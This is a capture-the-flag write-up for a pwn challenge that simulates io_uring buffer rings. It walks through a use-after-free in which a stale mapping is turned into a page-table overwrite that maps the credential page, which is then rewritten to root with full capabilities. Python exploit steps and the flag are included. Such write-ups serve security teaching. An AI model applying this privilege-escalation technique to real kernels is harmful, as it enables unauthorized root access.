# StaleMate Writeup

## Description

The kernel made its move already, you are now in the Stalemate position so can you turn the tide???

Server: `nc pwn.v1t.site 31337`

Backup server: `nc chall.v1t.site 31337`

## Solution Walkthrough

1. **Step 1**：

    Challenge menu:

    ```text
    1. IORING_REGISTER_PBUF_RING
    2. mmap pbuf ring
    3. IORING_UNREGISTER_PBUF_RING
    4. io_uring_buf_ring_add
    5. inspect mapped ring entry
    6. create mm context
    7. vm alloc user page
    8. vm read
    9. vm write
    10. open flag
    ```

    The goal is to modify the credential through the simulated memory management functionality, allowing the open flag permission check to pass and read out the flag.

2. **Step 2**：

    First, trigger the UAF. The memory allocation looks like this:

    ```text
    PFN 1 : cred page
    PFN 2 : initial pbuf ring page
    PFN 3 : scratch page
    ```

    Therefore, we can trigger the UAF in the following way:

    ```python
    register_pbuf(0, 256, 1)
    mmap_pbuf(0)
    ...
    unregister_pbuf(0)
    ...
    create_mm()
    ```

    This causes PFN 2 to be freed and reused as the page table of vm 0. However, since map 0 still points to PFN 2, we can modify vm 0's page table through the old pbuf mapping.

3. **Step 3**：

    After creating the mm context, we can use inspect mapped ring entry (menu 5.) to read the page table through the stale mapping.

    The exploit reads map entry 3:

    ```python
    _, scratch_pte = inspect(0, 3)
    ```

    Each pbuf ring entry occupies 16 bytes:

    ```c
    struct io_uring_buf {
        __u64 addr;
        __u32 len;
        __u16 bid;
        __u16 resv;
    };
    ```

    Therefore, each entry can be viewed as two qwords:

    ```text
    entry.addr                 -> low qword
    entry.len/bid/resv         -> high qword
    ```

    Map entry 3 corresponds to the following entries in the page table:

    ```text
    entry 3 low qword  = PTE[6]
    entry 3 high qword = PTE[7]
    ```

    PTE[7] is the PTE of the scratch page, which is the encrypted PTE for PFN 3.

    The exploit reconstructs a 64-bit qword from `len`, `bid`, and `resv`:

    ```python
    high_qword = length | (bid << 32) | (resv << 48)
    ```

    This high qword is the encrypted PTE of the scratch page.

    Then we need to change the scratch PTE into the cred PTE. The PTE in this challenge is not simply plaintext; it has a simple obfuscation. However, we do not need to know the full key. We only need to apply the PFN difference.

    The scratch PTE originally points to PFN 3, and the goal is to make it point to PFN 1.

    The PFN of the PTE is located after bit 12, so we only need to XOR:

    ```python
    cred_pte = scratch_pte ^ ((3 ^ 1) << 12)
    ```

    This gives us an encrypted PTE that points to the cred page.

4. **Step 4**：

    Next, use io_uring_buf_ring_add (menu 4.) to write into the page table through the stale map.

    Map entry 0 overwrites the first two PTEs of the page table:

    ```text
    entry 0 addr                 -> PTE[0]
    entry 0 len/bid/resv         -> PTE[1]
    ```

    Set both PTE[0] and PTE[1] to cred_pte:

    ```python
    buf_ring_add(
        0,
        0,
        cred_pte,
        cred_pte & 0xffffffff,
        (cred_pte >> 32) & 0xffff,
        (cred_pte >> 48) & 0xffff,
    )
    ```

    Address 0x0 in vm 0 will be mapped to PFN 1, which is the cred page.

    Finally, modify the credential. From reversing and exploit testing, the cred structure can be summarized as:

    ```text
    0x00  "CREDv1"
    0x08  uid / gid related fields
    0x10  uid / gid related fields
    0x18  capability field
    0x20  checksum / hash
    ```

    We do not write starting from 0x0 to avoid corrupting the magic `CREDv1`, so we start writing from 0x8:

    ```python
    root_cred = b"\x00" * 16 + b"\xff" * 8
    vm_write(0, 8, root_cred)
    ```

    The result will be:

    ```text
    +0x08 ~ +0x17 : cleared to 0, equivalent to uid/gid = 0
    +0x18 ~ +0x1f : set to 0xffffffffffffffff, equivalent to enabling all capabilities
    ```

    The checksum / hash remains unchanged, so it can pass the challenge's credential check.

    Finally, choose:

    ```python
    choose(10)
    ```

    This calls open flag.

## Flag

```text
v1t{pfnmap_pbuf_pages_should_outlive_the_mmap}
```
